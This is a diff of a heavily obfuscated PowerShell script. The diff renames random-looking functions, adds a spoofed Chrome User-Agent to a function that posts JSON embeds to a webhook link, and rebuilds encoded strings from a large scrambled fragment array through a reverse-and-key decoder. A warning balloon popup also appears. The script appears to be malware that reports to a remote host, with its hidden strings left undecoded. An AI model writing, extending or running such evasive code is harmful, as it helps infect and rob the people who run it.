@@ -1,6 +1,6 @@
 $ErrorActionPreference = "Continue"
 Add-Type -AssemblyName System.Windows.Forms
-function qKdRktBcgZJt($title, $text, $duration) {
+function DmGjLBCMcXLr($title, $text, $duration) {
 try {
 $balloon = New-Object System.Windows.Forms.NotifyIcon
 $balloon.Icon = [System.Drawing.SystemIcons]::Warning
@@ -12,7 +12,7 @@ Start-Sleep -Seconds $duration
 $balloon.Dispose()
 } catch { }
 }
-function IRKjsmBcEfqQ($link, $title, $color, $fields) {
+function EsbVjQcxeTWq($link, $title, $color, $fields) {
 try {
 $embedBody = @{
 embeds = @(
@@ -23,10 +23,13 @@ fields = $fields
 }
 )
 } | ConvertTo-Json -Depth 10
-Invoke-RestMethod -Uri $link -Method Post -ContentType "application/json" -Body $embedBody -ErrorAction Stop | Out-Null
+$headers = @{
+"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+}
+Invoke-RestMethod -Uri $link -Method Post -Headers $headers -ContentType "application/json" -Body $embedBody -ErrorAction Stop | Out-Null
 } catch { }
 }
-function xYEfLAHsaMBd($reversed, $key) {
+function sDmYimBhjKXw($reversed, $key) {
 try {
 $charArr = $reversed.ToCharArray()
 [array]::Reverse($charArr)
@@ -42,298 +45,326 @@ return [System.Text.Encoding]::UTF8.GetString($result)
 return $reversed
 }
 }
-$UFWPQCoizQlt = @("AUlX", "ae15", "EcRZ", "babf", "29FX", "CwQD", "06f3", "f482", "efde", "2ad1", "=kFW", "QAUF", "PgnS", "b128", "Axgb", "5a14", "0176", "0fb8", "7b1e", "RJBV", "IJhF", "2d7f", "a9e1", "bNlf", "f682", "8690", "WJBG", "UBgB", "3079", "a2ae", "ABjG", "WExN", "XZwX", "BZxF", "HU1C", "640d", "HoUV", "GNVN", "e825", "a73c", "33c5", "MVQD", "955e", "febc", "FdBQ", "ARVJ", "vhhB", "7JFX", "caa3", "1483", "==AA", "H4AE", "fJkU", "bf16", "6dBV", "2dc7", "FNRQ", "bZgV", "d803", "8e3b", "9gQc", "5f8b", "=IES", "AQgV", "e8ba", "d65f", "7e08", "ae7b", "7592", "7536", "813d", "W8lW", "6b87", "9QmB", "d5e6", "fFEF", "d6e8", "F5gf", "QdQE", "baaf", "ff3e", "8779", "l1FD", "751c", "a685", "36df", "d1a7", "FwAA", "MMkC", "9b70", "phVU", "8eca", "bbe9", "8acb", "xtXC", "CNBS", "exEE", "yokV", "GIQF", "DoAE", "5327", "e5a4", "e8b9", "f875", "GRgU", "c49b", "7045", "MwAD", "rdlW", "71c8", "atwX", "YlUW", "f778", "8ba3", "QdhX", "pRGV", "a1b9", "631d", "826a", "5kgC", "AMgR", "1148", "KhgF", "QxVc", "af9d", "50jR", "F9lU", "fdVD", "5b52", "ZBAH", "cff6", "bd89", "0bcf", "77a1", "2c79", "cxgY", "e39e", "16a6", "9ab4", "28ea", "7ec8", "7e0c", "1b57", "NF0X", "aF1Q", "MIUA", "d7f9", "ac42", "UhhG", "W1AN", "klFc", "0f13", "b56a", "e173", "8526", "5044", "WBgV", "bfd5", "dd33", "fJFX", "ThlU", "NRUW", "MdFF", "1dda", "CcQF", "ft1Z", "NIRE", "89b3", "7e88", "e702", "WtxU", "==AE", "sYjK", "9a0d", "0VhS", "d816", "OUlU", "f80d", "57d3", "38ad", "510f", "5d7e", "3e4f", "74ec", "9f7e", "==QU", "3be1", "aIRX", "ItTC", "UFVR", "YsxB", "TtEF", "==AU", "==wc", "cfad", "b40b", "e737", "2f35", "ZVFX", "BpkS", "ac60", "d587", "Sgha", "8eb3", "4973", "fFQF", "35ac", "ZUxS", "1eeb", "73d8", "dd8a", "QZhQ", "OhQQ", "a25b", "0231", "UdkX", "4675", "3a91", "==AT", "XUxA", "850a", "05ab", "0a0e", "Ah1X", "RVxR", "ERUH", "4597", "RQ3X", "d533", "8033", "8467", "0d8c", "e0bc", "X4FQ", "NpAX", "HIED", "a570", "==AG", "CpVB", "ddec", "0f49", "6809", "d21f", "96da", "d259", "b575", "VV0C", "99c2", "6b35", "3YBX", "71c0", "VpEA", "2464", "0983", "EQke", "AYhF", "HV0A", "S4FB", "QIEX", "7syB", "dZhV", "a137", "9eb8", "8cd3", "a488", "4eed", "e398", "27f3", "a7ee", "e776", "RUUW", "91ce", "WdQA", "BZxQ", "25fc", "cbef", "175a", "e993", "e9FX", "6001", "Wogb", "7c55", "RpUW", "de3e", "ba54", "22ae", "3100", "XMgL", "4957", "GUwW", "e118", "NgAA", "PBwF", "1411", "0d9e", "ffc4", "0431", "JpVU", "acxA", "SpVQ", "aZBA", "087e", "==QA", "=cVS", "Z1XM", "53c8", "PdAZ", "eJwW", "clFW", "W93R", "BJFE", "TF1U", "5BBR", "bbb5", "3957", "tM0c", "M0VV", "1bac", "bVlW", "4f5c", "73fc", "2866", "PhUQ", "1176", "HRlQ", "69d9", "aaad", "BRFH", "0865", "U5VR", "77f5", "fc6b", "75e2", "JNEJ", "8d44", "5f8c", "hQVV", "14aa", "b22c", "a220", "UJVf", "6ca9", "D8lC", "bRgW", "MNwX", "NFhX", "0f07", "T5RV", "CoAB", "PA1A", "olGE", "9772", "J1QQ", "87ec", "f360", "GJAC", "487c", "503e", "Td1V", "YVUQ", "lJRQ", "ce74", "BAEI", "8909", "KIlR", "c0e2", "e6b0", "DQxX", "WNRT", "ecc2", "WdlW", "97a7", "RkxB", "bec2", "EEBW", "5698", "3a74", "B1FV", "JwXf", "Zo0D", "=oER", "edb5", "XNEG", "fNlV", "8281", "8RRF", "01d9", "229c", "7dc9", "Alld", "c4ca", "YkUQ", "ehFb", "8235", "3371", "08b8", "+AlU", "dc19", "6d7b", "27c1", "31b1", "TVxU", "WZUM", "334b", "575d", "aace", "10d5", "e1wd", "Pg1C", "==QQ", "HMVT", "VtlU", "XpEZ", "e969", "TA0A", "ChkF", "5683", "a25a", "vxxD", "655b", "RNXZ", "5367", "64d6", "cBEE", "SwgW", "c28c", "GwAZ", "3c12", "dl0N", "cccd", "a52d", "XUlV", "a1b7", "KQ1R", "612d", "LdEB", "==gB", "0222", "NhwA", "jABV", "eV1X", "HBBD", "YYVW", "b477", "a513", "3727", "==gZ", "4e3a", "bZRZ", "JswJ", "KwQF", "x4VF", "b562", "2a30", "cb2f", "Uw0U", "==gE", "chFU", "2db7", "7063", "zYUZ", "6ce9", "850d", "WcBX", "1991", "5065", "RxkH", "YFlQ", "GZUV", "fefc", "U51Q", "Sw1X", "VZBU", "fxwY", "H8VC", "f69a", "VFgX", "yMVd", "d1FB", "77d2", "1c3a", "BZXA", "==QR", "DUwd", "bae7", "a580", "0132", "UAlU", "2897", "3ca0", "BdlC", "e8a2", "e0b3", "YVlW", "PZRB", "0cc1", "f442", "44a7", "66d7", "WdRY", "WQwN", "BNhU", "3544", "ccb1", "e6c0", "59d4", "==wQ", "d418", "LtUV", "3c8a", "35ad", "6491", "fcbf", "b1f5", "BkFF", "MwFD", "QdwS", "aec2", "jJEC", "bd8d", "RMDG", "b11V", "7a57", "680b", "FNUc", "5438", "4cba", "dbce", "AREU", "c4f2", "dpAe", "b7d7", "0b73", "VN0F", "d63f", "SlFY", "4d44", "80fb", "VplW", "b00b", "YVAS", "X5le", "822b", "XIlJ", "bYxA", "3e90", "=cxF", "b1e1", "623d", "ee26", "==QW", "1dae", "BVTP", "VchX", "0056", "ac4b", "069e", "1092", "ef2e", "8MlC", "367a", "b2dc", "9796", "2fb4", "uNAB", "DBFG", "EJgV", "TJUE", "dFlT", "=QkF", "KZ1C", "V0VA", "6620", "7651", "636d", "0219", "ced1", "83e8", "1f88", "bRkQ", "FFgQ", "CU0C", "8729", "UsgQ", "TxgD", "dZBX", "7a66", "=k2G", "7e71", "9bac", "1191", "==AV", "2b1f", "9025", "73cf", "132e", "HcQE", "93e4", "Vxlc", "7840", "LsBE", "dae1", "dJBQ", "9115", "HYVK", "SAEA", "40e8", "4a59", "VoAe", "m5lW", "52d4", "abe0", "d445", "d827", "VlVC", "ZdiS", "SdUD", "0627", "Vt0M", "fREU", "L5Va", "b7f5", "0c1a", "281c", "0ecc", "KVhU", "agVQ", "CskB", "3ba5", "3953", "e9d4", "B8wD", "HxFW", "AN1N", "f64e", "fxVQ", "HQ1F", "WdVV", "TIWO", "3675", "3c81", "2559", "fdf9", "5486", "4208", "==AB", "fFEV", "VVFR", "e57e", "dhAF", "c4e6", "0d78", "RklC", "a13b", "Zw0S", "d87b", "86c3", "285e", "==AR", "V5xU", "E41T", "VUhR", "FNkV", "N4CZ", "f2b1", "LZ0F", "d3ba", "cbd2", "3be9", "cb01", "b240", "rBBc", "CEUS", "7ac1", "8c91", "NwAD", "cd87", "=oEA", "alVQ", "a61a", "dc00", "AQAA", "RsVU", "15d6", "5794", "f2d1", "c64f", "944c", "da97", "F8FC", "9EkU", "6e9a", "d181", "4e1a", "N5FF", "18e5", "HRkV", "Z1AF", "101d", "5fc8", "WB1E", "fhlM", "e096", "9f88", "ItEK", "87fb", "04f7", "e342", "9498", "99f3", "b453", "OlAC", "FwVZ", "351f", "5bac", "31e8", "BZlR", "fa6b", "4b52", "wgWc", "GYhU", "fb5e", "AQUa", "4232", "0161", "LIhX", "RERc", "e116", "0313", "fa91", "==gQ", "EdEX", "YhFX", "QgFF", "VRET", "28dd", "32f2", "52f8")
-$nXiZflAJTwOf = -join @($UFWPQCoizQlt[380], $UFWPQCoizQlt[660], $UFWPQCoizQlt[649], $UFWPQCoizQlt[540], $UFWPQCoizQlt[148], $UFWPQCoizQlt[579], $UFWPQCoizQlt[161])
-$pDvtaWKoFTHm = -join @($UFWPQCoizQlt[557], $UFWPQCoizQlt[522], $UFWPQCoizQlt[406], $UFWPQCoizQlt[210], $UFWPQCoizQlt[222], $UFWPQCoizQlt[67], $UFWPQCoizQlt[154], $UFWPQCoizQlt[17])
-$YmnSMILmEwMi = xYEfLAHsaMBd $nXiZflAJTwOf $pDvtaWKoFTHm
-$EvjSBXaUbork = -join @($UFWPQCoizQlt[446], $UFWPQCoizQlt[94], $UFWPQCoizQlt[671], $UFWPQCoizQlt[494], $UFWPQCoizQlt[304], $UFWPQCoizQlt[30], $UFWPQCoizQlt[159], $UFWPQCoizQlt[23], $UFWPQCoizQlt[259], $UFWPQCoizQlt[188], $UFWPQCoizQlt[272], $UFWPQCoizQlt[4], $UFWPQCoizQlt[47], $UFWPQCoizQlt[315], $UFWPQCoizQlt[120], $UFWPQCoizQlt[374], $UFWPQCoizQlt[460], $UFWPQCoizQlt[119], $UFWPQCoizQlt[428], $UFWPQCoizQlt[477], $UFWPQCoizQlt[420], $UFWPQCoizQlt[143], $UFWPQCoizQlt[732], $UFWPQCoizQlt[472], $UFWPQCoizQlt[63], $UFWPQCoizQlt[681], $UFWPQCoizQlt[156], $UFWPQCoizQlt[289], $UFWPQCoizQlt[348], $UFWPQCoizQlt[176], $UFWPQCoizQlt[379], $UFWPQCoizQlt[278], $UFWPQCoizQlt[189], $UFWPQCoizQlt[626], $UFWPQCoizQlt[111], $UFWPQCoizQlt[129], $UFWPQCoizQlt[616], $UFWPQCoizQlt[114], $UFWPQCoizQlt[466], $UFWPQCoizQlt[672], $UFWPQCoizQlt[553])
-$CMynQZpWsLZn = -join @($UFWPQCoizQlt[341], $UFWPQCoizQlt[623], $UFWPQCoizQlt[178], $UFWPQCoizQlt[452], $UFWPQCoizQlt[686], $UFWPQCoizQlt[603], $UFWPQCoizQlt[252], $UFWPQCoizQlt[386])
-$xaKPlBlGRftx = xYEfLAHsaMBd $EvjSBXaUbork $CMynQZpWsLZn
-$gImAQgxRYRLc = -join @($UFWPQCoizQlt[456], $UFWPQCoizQlt[223], $UFWPQCoizQlt[57], $UFWPQCoizQlt[615], $UFWPQCoizQlt[291], $UFWPQCoizQlt[300], $UFWPQCoizQlt[435], $UFWPQCoizQlt[257], $UFWPQCoizQlt[451], $UFWPQCoizQlt[12], $UFWPQCoizQlt[521], $UFWPQCoizQlt[187], $UFWPQCoizQlt[215], $UFWPQCoizQlt[433], $UFWPQCoizQlt[255], $UFWPQCoizQlt[367], $UFWPQCoizQlt[438], $UFWPQCoizQlt[544], $UFWPQCoizQlt[199], $UFWPQCoizQlt[166], $UFWPQCoizQlt[345])
-$EYiMByTYftTZ = -join @($UFWPQCoizQlt[691], $UFWPQCoizQlt[268], $UFWPQCoizQlt[628], $UFWPQCoizQlt[688], $UFWPQCoizQlt[405], $UFWPQCoizQlt[648], $UFWPQCoizQlt[728], $UFWPQCoizQlt[496])
-$jKEAXejQslPz = xYEfLAHsaMBd $gImAQgxRYRLc $EYiMByTYftTZ
-$JfyqhhnksKnT = -join @($UFWPQCoizQlt[587], $UFWPQCoizQlt[581], $UFWPQCoizQlt[282], $UFWPQCoizQlt[385], $UFWPQCoizQlt[625], $UFWPQCoizQlt[697], $UFWPQCoizQlt[144], $UFWPQCoizQlt[391], $UFWPQCoizQlt[297], $UFWPQCoizQlt[246], $UFWPQCoizQlt[75], $UFWPQCoizQlt[190], $UFWPQCoizQlt[580], $UFWPQCoizQlt[26], $UFWPQCoizQlt[298], $UFWPQCoizQlt[716], $UFWPQCoizQlt[722])
-$xiOKxkqMxRJA = -join @($UFWPQCoizQlt[563], $UFWPQCoizQlt[330], $UFWPQCoizQlt[241], $UFWPQCoizQlt[21], $UFWPQCoizQlt[687], $UFWPQCoizQlt[89], $UFWPQCoizQlt[83], $UFWPQCoizQlt[491])
-$flPcoEboIdtV = xYEfLAHsaMBd $JfyqhhnksKnT $xiOKxkqMxRJA
-$yyJIExBZLIcj = -join @($UFWPQCoizQlt[482], $UFWPQCoizQlt[107], $UFWPQCoizQlt[256], $UFWPQCoizQlt[95], $UFWPQCoizQlt[122], $UFWPQCoizQlt[662], $UFWPQCoizQlt[533], $UFWPQCoizQlt[211], $UFWPQCoizQlt[414], $UFWPQCoizQlt[359], $UFWPQCoizQlt[402])
-$KGojfwPNefYg = -join @($UFWPQCoizQlt[228], $UFWPQCoizQlt[492], $UFWPQCoizQlt[400], $UFWPQCoizQlt[169], $UFWPQCoizQlt[390], $UFWPQCoizQlt[214], $UFWPQCoizQlt[634], $UFWPQCoizQlt[667])
-$mtjqNjggsZye = xYEfLAHsaMBd $yyJIExBZLIcj $KGojfwPNefYg
-$siyAxqmgGHeM = -join @($UFWPQCoizQlt[636], $UFWPQCoizQlt[370], $UFWPQCoizQlt[382], $UFWPQCoizQlt[198], $UFWPQCoizQlt[270], $UFWPQCoizQlt[20], $UFWPQCoizQlt[618])
-$QZOQQVeSWrVA = -join @($UFWPQCoizQlt[177], $UFWPQCoizQlt[321], $UFWPQCoizQlt[245], $UFWPQCoizQlt[147], $UFWPQCoizQlt[399], $UFWPQCoizQlt[529], $UFWPQCoizQlt[593], $UFWPQCoizQlt[217])
-$YRQPvydhTNGI = xYEfLAHsaMBd $siyAxqmgGHeM $QZOQQVeSWrVA
-$NwdJpuqUAzfd = -join @($UFWPQCoizQlt[436], $UFWPQCoizQlt[631], $UFWPQCoizQlt[364], $UFWPQCoizQlt[219], $UFWPQCoizQlt[299], $UFWPQCoizQlt[56], $UFWPQCoizQlt[234], $UFWPQCoizQlt[700], $UFWPQCoizQlt[31])
-$qOwWDmenwSvz = -join @($UFWPQCoizQlt[239], $UFWPQCoizQlt[42], $UFWPQCoizQlt[393], $UFWPQCoizQlt[713], $UFWPQCoizQlt[642], $UFWPQCoizQlt[429], $UFWPQCoizQlt[561], $UFWPQCoizQlt[371])
-$biXqZcyfvfxs = xYEfLAHsaMBd $NwdJpuqUAzfd $qOwWDmenwSvz
-$GKDhOguRkAjz = -join @($UFWPQCoizQlt[478], $UFWPQCoizQlt[312], $UFWPQCoizQlt[585], $UFWPQCoizQlt[543])
-$kkmGOZBHwDNz = -join @($UFWPQCoizQlt[531], $UFWPQCoizQlt[670], $UFWPQCoizQlt[66], $UFWPQCoizQlt[511], $UFWPQCoizQlt[229], $UFWPQCoizQlt[109], $UFWPQCoizQlt[180], $UFWPQCoizQlt[547])
-$XFjhUrcDpDpr = xYEfLAHsaMBd $GKDhOguRkAjz $kkmGOZBHwDNz
-$XFLBqthnByOh = -join @($UFWPQCoizQlt[193], $UFWPQCoizQlt[172])
-$eqeCeKzhIqvc = -join @($UFWPQCoizQlt[484], $UFWPQCoizQlt[61], $UFWPQCoizQlt[729], $UFWPQCoizQlt[146], $UFWPQCoizQlt[395], $UFWPQCoizQlt[454], $UFWPQCoizQlt[163], $UFWPQCoizQlt[253])
-$jepFzxJxznWp = xYEfLAHsaMBd $XFLBqthnByOh $eqeCeKzhIqvc
-$BVVwEnMdxyek = -join @($UFWPQCoizQlt[675], $UFWPQCoizQlt[731], $UFWPQCoizQlt[360], $UFWPQCoizQlt[126], $UFWPQCoizQlt[701])
-$MVLQstmsPezy = -join @($UFWPQCoizQlt[727], $UFWPQCoizQlt[437], $UFWPQCoizQlt[314], $UFWPQCoizQlt[369], $UFWPQCoizQlt[519], $UFWPQCoizQlt[403], $UFWPQCoizQlt[290], $UFWPQCoizQlt[706])
-$oWpbPOZlnPWp = xYEfLAHsaMBd $BVVwEnMdxyek $MVLQstmsPezy
-$NIObYQUCyHBq = -join @($UFWPQCoizQlt[719])
-$GhhbpMwzjEIf = -join @($UFWPQCoizQlt[139], $UFWPQCoizQlt[28], $UFWPQCoizQlt[504], $UFWPQCoizQlt[640], $UFWPQCoizQlt[288], $UFWPQCoizQlt[232], $UFWPQCoizQlt[562], $UFWPQCoizQlt[485])
-$fRppcdwYJDUu = xYEfLAHsaMBd $NIObYQUCyHBq $GhhbpMwzjEIf
-$KjCIfsIswNHj = -join @($UFWPQCoizQlt[515], $UFWPQCoizQlt[508], $UFWPQCoizQlt[46], $UFWPQCoizQlt[123])
-$hueNHYLIygLF = -join @($UFWPQCoizQlt[356], $UFWPQCoizQlt[363], $UFWPQCoizQlt[59], $UFWPQCoizQlt[130], $UFWPQCoizQlt[3], $UFWPQCoizQlt[206], $UFWPQCoizQlt[558], $UFWPQCoizQlt[133])
-$AHsmYguiOXUS = xYEfLAHsaMBd $KjCIfsIswNHj $hueNHYLIygLF
-$fsUHUFlvkYSP = -join @($UFWPQCoizQlt[658], $UFWPQCoizQlt[310], $UFWPQCoizQlt[249], $UFWPQCoizQlt[450], $UFWPQCoizQlt[633])
-$DXIMOccBegUh = -join @($UFWPQCoizQlt[534], $UFWPQCoizQlt[549], $UFWPQCoizQlt[158], $UFWPQCoizQlt[651], $UFWPQCoizQlt[337], $UFWPQCoizQlt[332], $UFWPQCoizQlt[112], $UFWPQCoizQlt[488])
-$eLbvZmhSEknC = xYEfLAHsaMBd $fsUHUFlvkYSP $DXIMOccBegUh
-$TaFXUtWxVDZR = -join @($UFWPQCoizQlt[62], $UFWPQCoizQlt[439], $UFWPQCoizQlt[88], $UFWPQCoizQlt[104], $UFWPQCoizQlt[389])
-$PCNhViowZXMK = -join @($UFWPQCoizQlt[617], $UFWPQCoizQlt[650], $UFWPQCoizQlt[539], $UFWPQCoizQlt[542], $UFWPQCoizQlt[723], $UFWPQCoizQlt[683], $UFWPQCoizQlt[201], $UFWPQCoizQlt[142])
-$UFUnJwIQDmZH = xYEfLAHsaMBd $TaFXUtWxVDZR $PCNhViowZXMK
-$YuAMngxgzZDp = -join @($UFWPQCoizQlt[569], $UFWPQCoizQlt[32], $UFWPQCoizQlt[520], $UFWPQCoizQlt[0], $UFWPQCoizQlt[530])
-$LsPltRjhBlnD = -join @($UFWPQCoizQlt[427], $UFWPQCoizQlt[231], $UFWPQCoizQlt[365], $UFWPQCoizQlt[196], $UFWPQCoizQlt[128], $UFWPQCoizQlt[216], $UFWPQCoizQlt[606], $UFWPQCoizQlt[244])
-$wbVpfPCguvXV = xYEfLAHsaMBd $YuAMngxgzZDp $LsPltRjhBlnD
-$gVVMpuJvvxol = -join @($UFWPQCoizQlt[302], $UFWPQCoizQlt[392])
-$YzVsIXWDwmLB = -join @($UFWPQCoizQlt[70], $UFWPQCoizQlt[664], $UFWPQCoizQlt[317], $UFWPQCoizQlt[266], $UFWPQCoizQlt[351], $UFWPQCoizQlt[622], $UFWPQCoizQlt[39], $UFWPQCoizQlt[721])
-$YGjPlBeWSfGx = xYEfLAHsaMBd $gVVMpuJvvxol $YzVsIXWDwmLB
-$aqQwMuyQdKYc = -join @($UFWPQCoizQlt[50], $UFWPQCoizQlt[160], $UFWPQCoizQlt[541])
-$pSILICRGKuNu = -join @($UFWPQCoizQlt[384], $UFWPQCoizQlt[85], $UFWPQCoizQlt[443], $UFWPQCoizQlt[184], $UFWPQCoizQlt[208], $UFWPQCoizQlt[425], $UFWPQCoizQlt[497], $UFWPQCoizQlt[406])
-$yqEreLnfxUxG = xYEfLAHsaMBd $aqQwMuyQdKYc $pSILICRGKuNu
-$XJxdvCqQCKNW = -join @($UFWPQCoizQlt[658], $UFWPQCoizQlt[694], $UFWPQCoizQlt[528], $UFWPQCoizQlt[96], $UFWPQCoizQlt[678], $UFWPQCoizQlt[401], $UFWPQCoizQlt[602], $UFWPQCoizQlt[440], $UFWPQCoizQlt[343], $UFWPQCoizQlt[720], $UFWPQCoizQlt[565], $UFWPQCoizQlt[280])
-$tOjoRMEYfmKk = -join @($UFWPQCoizQlt[140], $UFWPQCoizQlt[323], $UFWPQCoizQlt[76], $UFWPQCoizQlt[204], $UFWPQCoizQlt[103], $UFWPQCoizQlt[421], $UFWPQCoizQlt[328], $UFWPQCoizQlt[86])
-$PolXUFvsCFRJ = xYEfLAHsaMBd $XJxdvCqQCKNW $tOjoRMEYfmKk
-$cPgRNtSwRRGR = -join @($UFWPQCoizQlt[78], $UFWPQCoizQlt[5], $UFWPQCoizQlt[251], $UFWPQCoizQlt[518], $UFWPQCoizQlt[467], $UFWPQCoizQlt[500])
-$DSmGOHnhbZqW = -join @($UFWPQCoizQlt[601], $UFWPQCoizQlt[705], $UFWPQCoizQlt[168], $UFWPQCoizQlt[527], $UFWPQCoizQlt[710], $UFWPQCoizQlt[283], $UFWPQCoizQlt[707], $UFWPQCoizQlt[444])
-$CSzXEAfZSOlE = xYEfLAHsaMBd $cPgRNtSwRRGR $DSmGOHnhbZqW
-$fRrReqngLnGG = -join @($UFWPQCoizQlt[237], $UFWPQCoizQlt[127], $UFWPQCoizQlt[605], $UFWPQCoizQlt[441], $UFWPQCoizQlt[627], $UFWPQCoizQlt[355], $UFWPQCoizQlt[493], $UFWPQCoizQlt[174], $UFWPQCoizQlt[164], $UFWPQCoizQlt[410], $UFWPQCoizQlt[98], $UFWPQCoizQlt[308], $UFWPQCoizQlt[41], $UFWPQCoizQlt[135])
-$SpTfYrrWHHeD = -join @($UFWPQCoizQlt[447], $UFWPQCoizQlt[175], $UFWPQCoizQlt[274], $UFWPQCoizQlt[243], $UFWPQCoizQlt[157], $UFWPQCoizQlt[293], $UFWPQCoizQlt[469], $UFWPQCoizQlt[489])
-$MwJDVRwxKTUC = xYEfLAHsaMBd $fRrReqngLnGG $SpTfYrrWHHeD
-$FRXAtNOWVKGN = -join @($UFWPQCoizQlt[658], $UFWPQCoizQlt[408], $UFWPQCoizQlt[258], $UFWPQCoizQlt[362])
-$QzAJOXZKvNJd = -join @($UFWPQCoizQlt[102], $UFWPQCoizQlt[458], $UFWPQCoizQlt[517], $UFWPQCoizQlt[513], $UFWPQCoizQlt[717], $UFWPQCoizQlt[394], $UFWPQCoizQlt[236], $UFWPQCoizQlt[262])
-$PLVtehsIpqHu = xYEfLAHsaMBd $FRXAtNOWVKGN $QzAJOXZKvNJd
-$WoopXefhmyVY = -join @($UFWPQCoizQlt[10], $UFWPQCoizQlt[224], $UFWPQCoizQlt[646], $UFWPQCoizQlt[45])
-$KSEjQSYKFqMz = -join @($UFWPQCoizQlt[261], $UFWPQCoizQlt[560], $UFWPQCoizQlt[81], $UFWPQCoizQlt[595], $UFWPQCoizQlt[702], $UFWPQCoizQlt[613], $UFWPQCoizQlt[38], $UFWPQCoizQlt[203])
-$JyAdHuIwpJVS = xYEfLAHsaMBd $WoopXefhmyVY $KSEjQSYKFqMz
-$sXeVIkeKBfkC = -join @($UFWPQCoizQlt[192], $UFWPQCoizQlt[514], $UFWPQCoizQlt[609], $UFWPQCoizQlt[499])
-$kTAOSJCllmpv = -join @($UFWPQCoizQlt[134], $UFWPQCoizQlt[737], $UFWPQCoizQlt[152], $UFWPQCoizQlt[495], $UFWPQCoizQlt[346], $UFWPQCoizQlt[113], $UFWPQCoizQlt[735], $UFWPQCoizQlt[141])
-$epJLoWcCHDJA = xYEfLAHsaMBd $sXeVIkeKBfkC $kTAOSJCllmpv
-$OqYnGkGBejwx = -join @($UFWPQCoizQlt[645], $UFWPQCoizQlt[292], $UFWPQCoizQlt[358], $UFWPQCoizQlt[36])
-$PQBFJikjusDc = -join @($UFWPQCoizQlt[167], $UFWPQCoizQlt[556], $UFWPQCoizQlt[673], $UFWPQCoizQlt[186], $UFWPQCoizQlt[698], $UFWPQCoizQlt[537], $UFWPQCoizQlt[64], $UFWPQCoizQlt[29])
-$TkTMePdGDTVk = xYEfLAHsaMBd $OqYnGkGBejwx $PQBFJikjusDc
-$IxrxMHNBJvGR = -join @($UFWPQCoizQlt[170], $UFWPQCoizQlt[463], $UFWPQCoizQlt[71], $UFWPQCoizQlt[455])
-$ETUuxoWrVyAw = -join @($UFWPQCoizQlt[422], $UFWPQCoizQlt[294], $UFWPQCoizQlt[656], $UFWPQCoizQlt[53], $UFWPQCoizQlt[338], $UFWPQCoizQlt[248], $UFWPQCoizQlt[479], $UFWPQCoizQlt[13])
-$rnyyTIYIxzvI = xYEfLAHsaMBd $IxrxMHNBJvGR $ETUuxoWrVyAw
-$dFZDYhVcETyE = -join @($UFWPQCoizQlt[423], $UFWPQCoizQlt[654], $UFWPQCoizQlt[487], $UFWPQCoizQlt[711], $UFWPQCoizQlt[661], $UFWPQCoizQlt[383], $UFWPQCoizQlt[324], $UFWPQCoizQlt[647], $UFWPQCoizQlt[411], $UFWPQCoizQlt[415], $UFWPQCoizQlt[212], $UFWPQCoizQlt[110], $UFWPQCoizQlt[571], $UFWPQCoizQlt[568], $UFWPQCoizQlt[665], $UFWPQCoizQlt[344], $UFWPQCoizQlt[442], $UFWPQCoizQlt[632], $UFWPQCoizQlt[327], $UFWPQCoizQlt[352], $UFWPQCoizQlt[33], $UFWPQCoizQlt[725], $UFWPQCoizQlt[682], $UFWPQCoizQlt[191])
-$fcDnRIzhqbIA = -join @($UFWPQCoizQlt[703], $UFWPQCoizQlt[718], $UFWPQCoizQlt[503], $UFWPQCoizQlt[267], $UFWPQCoizQlt[464], $UFWPQCoizQlt[69], $UFWPQCoizQlt[578], $UFWPQCoizQlt[295])
-$QKoEkPTajPQX = xYEfLAHsaMBd $dFZDYhVcETyE $fcDnRIzhqbIA
-$PjhPRuZLbmTH = -join @($UFWPQCoizQlt[162], $UFWPQCoizQlt[51], $UFWPQCoizQlt[90], $UFWPQCoizQlt[225], $UFWPQCoizQlt[97], $UFWPQCoizQlt[273], $UFWPQCoizQlt[407], $UFWPQCoizQlt[559], $UFWPQCoizQlt[165])
-$RZwrfwAKWxPl = -join @($UFWPQCoizQlt[575], $UFWPQCoizQlt[555], $UFWPQCoizQlt[40], $UFWPQCoizQlt[179], $UFWPQCoizQlt[106], $UFWPQCoizQlt[589], $UFWPQCoizQlt[264], $UFWPQCoizQlt[1])
-$eZhPcWQnfvDh = xYEfLAHsaMBd $PjhPRuZLbmTH $RZwrfwAKWxPl
-$HEbCMLOosYhr = -join @($UFWPQCoizQlt[205], $UFWPQCoizQlt[202], $UFWPQCoizQlt[689], $UFWPQCoizQlt[733], $UFWPQCoizQlt[254], $UFWPQCoizQlt[396], $UFWPQCoizQlt[473])
-$nXcJCNCHftYl = -join @($UFWPQCoizQlt[693], $UFWPQCoizQlt[284], $UFWPQCoizQlt[124], $UFWPQCoizQlt[116], $UFWPQCoizQlt[326], $UFWPQCoizQlt[641], $UFWPQCoizQlt[84], $UFWPQCoizQlt[592])
-$gAxOiuCKnaMQ = xYEfLAHsaMBd $HEbCMLOosYhr $nXcJCNCHftYl
-$RKhuqgcDgiRQ = -join @($UFWPQCoizQlt[233], $UFWPQCoizQlt[431], $UFWPQCoizQlt[412], $UFWPQCoizQlt[564], $UFWPQCoizQlt[149])
-$nhfDrSmJpsgF = -join @($UFWPQCoizQlt[676], $UFWPQCoizQlt[121], $UFWPQCoizQlt[462], $UFWPQCoizQlt[715], $UFWPQCoizQlt[480], $UFWPQCoizQlt[680], $UFWPQCoizQlt[413], $UFWPQCoizQlt[576])
-$zoRhJAwmBwXk = xYEfLAHsaMBd $RKhuqgcDgiRQ $nhfDrSmJpsgF
-$UxOtWbplIwJW = -join @($UFWPQCoizQlt[303], $UFWPQCoizQlt[659], $UFWPQCoizQlt[27], $UFWPQCoizQlt[620], $UFWPQCoizQlt[82], $UFWPQCoizQlt[19], $UFWPQCoizQlt[584], $UFWPQCoizQlt[726], $UFWPQCoizQlt[115], $UFWPQCoizQlt[483], $UFWPQCoizQlt[125], $UFWPQCoizQlt[470], $UFWPQCoizQlt[619], $UFWPQCoizQlt[663], $UFWPQCoizQlt[418], $UFWPQCoizQlt[600], $UFWPQCoizQlt[468], $UFWPQCoizQlt[449], $UFWPQCoizQlt[377], $UFWPQCoizQlt[570], $UFWPQCoizQlt[638], $UFWPQCoizQlt[60])
-$MeYqupTOQrGF = -join @($UFWPQCoizQlt[285], $UFWPQCoizQlt[9], $UFWPQCoizQlt[220], $UFWPQCoizQlt[611], $UFWPQCoizQlt[335], $UFWPQCoizQlt[629], $UFWPQCoizQlt[263], $UFWPQCoizQlt[279])
-$JnnHpBvrDZbL = xYEfLAHsaMBd $UxOtWbplIwJW $MeYqupTOQrGF
